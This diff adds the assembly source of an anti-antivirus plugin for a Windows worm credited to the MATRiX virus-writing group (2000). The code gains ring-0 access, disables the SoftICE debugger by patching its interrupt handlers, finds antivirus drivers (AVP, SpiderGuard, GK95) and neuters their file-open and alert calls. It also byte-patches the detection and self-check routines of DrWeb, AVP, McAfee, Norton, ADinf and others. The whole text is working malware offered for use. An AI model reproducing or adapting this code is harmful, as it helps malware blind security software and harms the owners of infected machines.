@@ -1,0 +1,614 @@
+   ; 
+   ; Trojan/W32/I-Worm.SABi┴ II
+   ; 
+   ; by NBK & ULTRAS / MATRiX
+   ; (c) 2000
+
+   ; Plugin       : ring-0 entering plugin + kill AV vxd + kill SoftICE
+   ; Version      : 1.2
+   ; Date release : 1 november
+
+   ; THANX Z0MBiE
+
+   ring0: ; ring0 c0de
+
+   call KillAVXD ; AV VxDs killer
+   call SoftICE  ; soft-ice fuckup extension
+   ret
+
+   SoftICE:    ; - soft-ice fuckup extension
+   pusha
+
+   sidt [esp-6]
+   mov ebx,[esp-4]
+
+   xor edx,edx
+
+   mov eax,[ebx+01h*8+6-2]      ; int 01h
+   mov ax,[ebx+01h*8+0]
+   call fint
+
+   mov eax,[ebx+03h*8+6-2]      ; int 03h
+   mov ax,[ebx+03h*8+0]
+   call fint
+
+   or edx, edx
+   jz exit
+
+   exit:                 
+   popa
+   stc  ; let others use this event too
+   retn
+
+   fint:
+   cmp byte ptr [eax],68h     ; softice signature
+   jne __skip
+   cmp byte ptr [eax+5],0E9h  ; -//-
+   jne __skip
+   mov byte ptr [eax],0CFh    ; iret   8-( )
+   inc edx
+   __skip:                
+   ret
+
+   KillAVXD:               
+   pusha
+   VxDcall VXDLDR,GetDeviceList
+
+   scan@vxd:        
+   mov ebx,[eax+5]
+
+   cmp ebx,0C0000000h
+   jb continue
+
+   lea ecx,[ebx+0Ch]  ; Name_0
+
+   mov edx,[ecx]
+   neg edx
+
+   mov cl,1
+   cmp edx,-'DIPS'   ; SPIDER
+   je @patchit
+   mov cl,2
+   cmp edx,-'9PVA'   ; AVP95
+   je @patchit
+   mov cl,4
+   cmp edx, -'GPVA'   ; AVPGUARD
+   je @patchit
+   mov cl,8
+   cmp edx,-'59KG'   ; GK95
+   je @patchit
+
+   continue:       
+   mov eax,[eax]
+   or eax,eax
+   jnz scan@vxd
+
+   popa
+   stc             ; let others use this event too
+   retn
+
+   @patchit:          
+   pusha
+
+   pusho kavxd_kill_moveax
+   pop ebp
+
+   mov esi, 0000D500h     ; R0_OPENCREATFILE
+   call killz
+   mov esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
+   call killz
+
+   cmp cl, 4   ;  avpguard
+   jne __skip1
+
+;  mov eax, 1+1Bh          ; unload vxd
+;  call dword ptr [ebx+18h] ; control_proc_0
+
+   pusho kavxd_kill_cd20
+   pop ebp
+
+   mov esi, 002A001Ah     ; VWIN32_SysErrorBox
+   call killz
+   mov esi, 002A000Eh     ; VWIN32_SetWin32Event
+   call killz
+
+   pusho kavxd_kill_badcall
+   pop ebp
+
+   mov eax,002Ah ; VMM
+   xor edi,edi
+   VMMcall Get_DDB
+   mov edx,[ecx+30h]  ; DDB_Service_Table_Ptr
+
+   ; LEA, but not MOV !
+   lea esi,[edx+4*001Ah] ; VWIN32_SysErrorBox
+   call killz
+   lea esi, [edx+4*000Eh] ; VWIN32_SetWin32Event
+   call killz
+
+   __skip1:                
+   popa
+   jmp continue
+
+   killz:          
+   pusha
+   mov edi, [ebx+18h]  ; Control_Proc_0
+
+   kavxd@1:              
+   lea ecx,[edi+4]    ; check presence for
+   test ecx,00000FFFh  ; each new page encountered
+   jnz kavxd@2
+
+   pusha
+
+   sub esp,28
+   mov esi,esp
+
+   push 28
+   push esi             ; esi = MEMORY_BASIC_INFO
+   push ecx
+   VxDcall VMM,PageQuery
+
+   test dword ptr [esi+10h],1000h ; mbi_state & MEM_COMMIT
+   lea esp,[esp+4*3+28]
+   popa
+   jnz kavxd@2
+
+   popa
+   retn
+
+   kavxd@2:              
+   inc edi
+
+   cmp [edi],esi           ; <esi>
+   jne kavxd@1
+   call ebp
+
+   jmp kavxd@1
+
+   kavxd_kill_moveax:      
+   cmp byte ptr [edi-1],0B8h
+   jne rt
+   mov dword ptr [edi],-1  ; R0_xxx <-- 0xFFFFFFFF
+   retn
+
+   kavxd_kill_cd20:        
+   cmp word ptr [edi-2],20CDh
+   jne rt
+
+   kavxd_kill_both:        
+   mov word ptr [edi-2],0B890h  ; nop/mov eax, 1
+   mov dword ptr [edi],1
+   retn
+
+   kavxd_kill_badcall:     
+   cmp word ptr [edi-2], 15FFh
+   je kavxd_kill_both
+   rt:                     
+   retn
+
+   ; call ring0 procedure
+
+   callring0:
+
+   pusha
+   enter 0C8h,0
+   push -1
+   call call_GetCurrentThread
+   xchg ebx, eax
+
+   push esp
+   push ebx
+   call call_GetThreadContext
+
+   push 28h
+   pop eax
+   xchg eax,[esp+0BCh]
+   mov _save_cs,eax
+
+   lea eax,ring0code_caller
+   xchg eax,[esp+0B8h]
+   mov _save_eip,eax
+
+   push esp
+   push ebx
+   call call_SetThreadContext
+
+   pop eax
+   leave
+   popa
+   ret
+
+   ring0code_caller:
+
+   mov ss:_save_esp,esp
+   lea esp,end_of_my_stack
+
+   pushf
+   pusha
+   push ds es
+
+   push ss ss
+   pop ds es
+
+   call ring0
+
+   pop es ds
+   popa
+   popf
+
+   mov esp,ss:_save_esp
+
+   pushf
+   push ss:_save_cs
+   push ss:_save_eip
+   iret
+
+;----------------------------------------------------------------------------
+; AAV -- Anti-Anti-Virus -- (x) 2000
+;
+;   antivirus:  crack subject:
+;   ~~~~~~~~~   ~~~~~~~~~~~~~
+;
+; ■ DRWEB       std-csum
+; ■ AVP         lancrypto-csum, std-csum, .avc csum checking
+; ■ MACAFE      virus-detection, self-check
+; ■ NAV         virus-detection
+; ■ ADINF       crc16/32/48             ; лучше немного глюков,
+; ■ AVPI        crc32, boot-warning     ; чем всякие варнинги.
+;   ...
+;
+;----------------------------------------------------------------------------
+
+; subroutine: patch_buffer
+; action:     find suckin antiviral code and patch it
+; input:      ESI=buffer (the whole file, as a rule)
+;             ECX=size
+; output:     EAX=# of changed bytes
+; comment:    all crks are made offset-independent
+;             to support as much av-versions as possible
+
+popa_eax                =       (dword ptr 7*4)
+
+patch_buffer:           pusha
+
+                        xor     ebx, ebx
+
+__cycle:                mov     eax, [esi]
+
+                        cmp     eax, 0E230D630h ; WEB
+                        je      __patch1
+
+                        cmp     eax, 05B9C245Eh ; AVP
+                        je      __patch2
+                        cmp     eax, 0C233D333h ;
+                        je      __patch3
+                        cmp     eax, 0C83B08C4h ;
+                        je      __patch4
+
+                        cmp     eax, 002C08789h ; MACAFE
+                        je      __patch5
+                        cmp     eax, 001FC45C7h ;
+                        je      __patch6
+
+                        cmp     eax, 75FF0CC4h  ; NAV
+                        je      __patch7
+                        cmp     eax, 7502F883h  ;
+                        je      __patch8
+                        cmp     eax, 7503F883h  ;
+                        je      __patch8
+
+                        cmp     eax, 01E32D88Ah ; ADINF
+                        je      __patch9
+
+                        cmp     eax, 08B08E8C1h ; AVPI
+                        je      __patch10
+                        cmp     eax, 08B08E9C1h ;
+                        je      __patch10
+                        cmp     ax, 0BE1Fh      ;
+                        je      __patch11
+                        cmp     eax, 016CDC033h ;
+                        je      __patch12
+
+                        cmp     eax, 0FFF013E8h ; AVT
+                        je      __patch13
+
+                        cmp     eax, 70BFE88Bh  ; MTX (SABI┴-I)
+                        je      __patch14
+
+__continue:             inc     esi
+                        dec     ecx
+                        jnz     __cycle
+
+                        mov     [esp].popa_eax, ebx     ; popa.eax
+
+                        popa
+                        retn
+
+;----------------------------------------------------------------------------
+
+; DRWEB -- std-csum
+
+;[30 D6                 xor     dh, dl
+; 30 E2]                xor     dl, ah
+; 30 C4                 xor     ah, al
+; .. ..
+; 30 F0                 xor     al, dh  -->   00 F0   add al, dh
+
+__patch1:               cmp     word ptr [esi+4], 0C430h
+                        jne     __continue
+                        mov     edx, 16
+__a1:                   cmp     word ptr [esi+edx], 0F030h
+                        je      __a2
+                        dec     edx
+                        jnz     __a1
+                        jmp     __continue
+__a2:                   mov     byte ptr [esi+edx], 00h
+                        inc     ebx
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
+
+; AVP -- lancrypto-csum
+
+; 7507                  jne     xxxxxxxx
+; 40                    inc     eax
+; 663D0900              cmp     ax, 9
+; 72E6                  jb      xxxxxxxx
+; 662D0900              sub     ax, 9
+; 5F                    pop     edi
+; 66F7D8                neg     ax
+; 1BC0                  sbb     eax, eax      --> 33 C0 == xor eax, eax
+;[5E                    pop     esi
+; 249C                  and     al, 9C
+; 5B]                   pop     ebx
+; C9                    leave
+; C3                    retn
+
+__patch2:               cmp     dword ptr [esi-4], 0C01BD8F7h
+                        jne     __continue
+                        mov     byte ptr [esi-2], 33h
+                        inc     ebx
+                        jmp     __continue
+
+; AVP -- std-csum
+
+; 8BD0                  mov     edx, eax
+; 33DB                  xor     ebx, ebx
+; 8A19                  mov     bl, [ecx]
+; C1E208                shl     edx, 8
+;[33D3                  xor     edx, ebx
+; 33C2]                 xor     eax, edx      --> 33 C0  xor eax, eax
+
+; 8D1400                lea     edx, [eax][eax]
+; 8A19                  mov     bl, [ecx]
+;[33D3                  xor     edx, ebx
+; 33C2]                 xor     eax, edx      --> 33 C0  xor eax, eax
+
+__patch3:               cmp     dword ptr [esi-4], 08E2C119h
+                        je      __c1
+                        cmp     dword ptr [esi-4], 198A0014h
+                        jne     __continue
+__c1:                   mov     byte ptr [esi+3], 0C0h
+                        inc     ebx
+                        jmp     __continue
+
+; AVP -- .avc csum checking
+; 50                    push    eax
+; 57                    push    edi
+; E8xxxxxxxx            call    xxxxxxxx   ; calc_csum, which is now patched
+; 8B4E18                mov     ecx, [esi+18]
+; 83[C408               add     esp, 8
+; 3BC8]                 cmp     ecx, eax      --> 3B C9 == cmp ecx, ecx
+
+__patch4:               cmp     dword ptr [esi-4], 83184E8Bh
+                        jne     __continue
+                        cmp     byte ptr [esi-9], 0E8h
+                        jne     __continue
+                        mov     byte ptr [esi+3], 0C9h
+                        inc     ebx
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
+
+; MACAFE -- disable virus-detection
+
+; mcscan32.dll
+; B801000000            mov     eax, 1           --> B8 00 ...   mov eax, 0
+; EB02                  jmp     xxxxxxxx
+; 31C0                  xor     eax, eax
+; [8987C002]0000        mov     [edi+0000002C0], eax
+
+__patch5:               cmp     dword ptr [esi-4], 0C03102EBh
+                        jne     __continue
+                        cmp     dword ptr [esi-8], 1
+                        jne     __continue
+                        mov     byte ptr [esi-8], 0
+                        inc     ebx
+                        jmp     __continue
+
+; MACAFE -- disable self-check
+
+; mcutil32.dll
+; 83 C4 10              add     esp, 10h
+; 3B 45 F3              cmp     eax, [ebp+csum]
+; 74 07                 je      xxxxxxxx
+;[C7 45 FC 01]00 00 00  mov     [ebp+res], 1
+
+__patch6:               cmp     dword ptr [esi-4], 0774F345h
+                        jne     __continue
+                        cmp     dword ptr [esi-8], 3B10C483h
+                        jne     __continue
+                        cmp     dword ptr [esi+3], 1
+                        jne     __continue
+                        mov     byte ptr  [esi+3], 0
+                        inc     ebx
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
+
+; NAV -- virus-detection
+
+; FF 75 xx              push    [ebp+xx]
+; 8D 45 nn              lea     eax, [ebp+virus_id]
+; 50                    push    eax
+; FF 75 xx              push    [ebp+xx]
+; E8 xx xx xx xx        call    xxxxxxxx ; copy_virus_name
+; 83[C4 0C              add     esp, 0Ch
+; FF 75]xx              push    [ebp+xx]
+; E8 xx xx xx xx        call    xxxxxxxx ; _VLReleaseVirusHandle@4
+; 8B 45 nn              mov     eax, [ebp+virus_id]   ; <-- 33 C0 / 90
+; EB xx                 jmp     xxxxxxxx              ; (xor eax, eax / nop)
+
+__patch7:               mov     eax, [esi-16-2]
+                        xor     eax, [esi-13-2]
+                        mov     ax, [esi-9]
+                        xor     ax, [esi+10]
+                        cmp     eax, 75FF75FFh xor 458D458Bh
+                        jne     __continue
+                        mov     al, [esi-10]
+                        add     al, [esi-6]
+                        add     al, [esi+5]
+                        add     al, [esi+13]
+                        cmp     al, (50h+0E8h+0E8h+0EBh) and 0FFh
+                        jne     __continue
+                        mov     dword ptr [esi+10], 0EB90C033h
+                        add     ebx, 3
+                        jmp     __continue
+
+; NAV -- virus-detection(#2,redundant)
+
+;[83 F8 02||03          cmp     eax, xx   ; 2||3
+; 75]xx                 jnz     xxxxxxxx         ; --> EB (jmp)
+; 8D 45 xx              lea     eax, [ebp+xx]
+; 50                    push    eax
+; FF 75 xx              push    [ebp+xx]
+; 56||57                push    esi||edi
+; E8 xx xx xx xx        call    xxxxxxxx  ; _VLDetermineVirusIndex@12
+; 66 85 C0              test    ax, ax
+; 74||75 xx             jz||jnz xxxxxxxx
+
+__patch8:
+                        mov     eax, [esi+5-2]
+                        mov     ax, [esi+9]
+                        cmp     eax, 458D75FFh
+                        jne     __continue
+                        mov     eax, [esi+18-1]
+                        mov     al, [esi+8]
+                        xor     al, [esi+13]
+                        cmp     eax, 0C0856650h xor 0E8h
+                        jne     __continue
+                        mov     al, [esi+12]
+                        xor     al, [esi+21]
+                        and     al, 0FEh
+                        cmp     al, 56h xor 74h
+                        jne     __continue
+                        mov     byte ptr [esi+3], 0EBh
+                        inc     ebx
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
+
+; ADINF -- crc16/crc32
+
+; dsavcrc.dll
+; crc16
+; 33 DB                 xor     ebx, ebx
+;[8A D8                 mov     bl, al
+; 32 1E]                xor     bl, [esi]       --> 32 DB  xor bl, bl
+; 46                    inc     esi
+; D1 E3                 shl     ebx, 1
+; 8A C4                 mov     al, ah
+; 32 E4                 xor     ah, ah
+; 66 33 04 1F           xor     ax, [edi+ebx]
+; crc32
+; 33 DB                 xor     ebx, ebx
+;[8A D8                 mov     bl, al
+; 32 1E]                xor     bl, [esi]       --> 32 DB  xor bl, bl
+; 46                    inc     esi
+; C1 E3 02              shl     ebx, 2
+; C1 E8 08              shr     eax, 8
+; 33 04 1F              xor     eax, [edi+ebx]
+; E2 EE                 loop    xxxxxxxx
+
+__patch9:               mov     eax, [esi+4]
+                        xor     eax, [esi+8]
+                        cmp     eax, 8AE3D146h xor 66E432C4h
+                        je      __d1
+                        cmp     eax, 02E3C146h xor 3308E8C1h
+                        jne     __continue
+__d1:                   mov     byte ptr [esi+3], 0DBh
+                        inc     ebx
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
+
+; AVPI -- crc32
+
+;[C1 E8 08              shr     eax, 8
+; 8B]14 95 xx xx xx xx  mov     edx, crc32tab[edx*4]
+; 33 C2                 xor     eax, edx             ; --> 33 c0  xor eax,eax
+
+;[C1 E9 08              shr     ecx, 8
+; 8B]04 85 xx xx xx xx  mov     eax, crc32tab[eax*4]
+; 33 C1                 xor     eax, ecx             ; --> 33 c0  xor eax,eax
+
+__patch10:              mov     eax, [esi+4-2]
+                        mov     ax, [esi+10]
+                        cmp     eax, 9514C233h
+                        je      __e1
+                        cmp     eax, 8504C133h
+                        jne     __continue
+__e1:                   mov     byte ptr [esi+11], 0C0h
+                        inc     ebx
+                        jmp     __continue
+
+; AVPI -- boot warning
+
+; avpiboot.vxd (16-bit)
+; 0E                    push    cs
+;[1F                    pop     ds
+; BE]xx xx              mov     si, offset aErrorReadingBootShit
+; E8 xx xx              call    doDialogBox   ; --> B8   mov eax, ...
+; F9                    stc
+; EB xx                 jmp     xxxxxxxx
+
+__patch11:              mov     eax, [esi+7-2]
+                        mov     al, [esi-1]
+                        mov     ah, [esi+4]
+                        cmp     eax, 0EBF9E80Eh
+                        jne     __continue
+                        mov     byte ptr [esi+4], 0B8h
+                        inc     ebx
+                        jmp     __continue
+
+; avpiboot.vxd (16-bit)
+; 33 C0                 xor     ax, ax
+; CD 16                 int     16h     ; --> B0 6E  mov al, 'n'
+
+__patch12:              mov     word ptr [esi+2], 6EB0h
+                        inc     ebx
+                        inc     ebx
+                        jmp     __continue
+
+; avt.exe (32-bit)
+; 
+
+__patch13:              cmp     dword ptr [esi+4], 0E8006AFFh
+                        jne     __continue
+                        cmp     dword ptr [esi+8], 0FFFFF0AEh
+                        jne     __continue
+                        mov     dword ptr [esi], 090C3C033h
+                        add     ebx, 4
+                        jmp     __continue
+
+; mtx virus
+; (it's the time to stop :P)
+
+__patch14:              cmp     dword ptr [esi+4], 0BE004018h
+                        jne     __continue
+                        mov     dword ptr [esi], 090C3C033h
+                        add     ebx, 4
+                        jmp     __continue
+
+;----------------------------------------------------------------------------
